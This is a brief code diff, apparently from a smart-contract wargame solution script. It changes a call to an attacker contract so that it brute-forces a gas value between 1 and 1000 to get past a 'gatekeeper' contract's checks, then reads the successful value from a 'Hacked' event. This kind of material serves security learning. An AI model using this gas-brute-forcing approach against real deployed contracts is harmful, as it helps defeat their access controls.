@@ -16,8 +16,15 @@ async function main() {
   // console.log("tx: ", tx)
 
 
-  const tx2 = await attackgkone.attack();
-  console.log("tx2: ", tx2)
+  // Start bruteforcing
+    const [lowerGasBrute, upperGasBrute] = [1, 1000];
+    const hackTxn = await attackgkone.attack(
+      gatekeeperContract.address,
+      lowerGasBrute,
+      upperGasBrute
+    );
+    const { events } = await hackTxn.wait();
+    const { args: { gasBrute } } = events?.find(({ event }) => (event === "Hacked")) as HackedEvent;
 
 
 
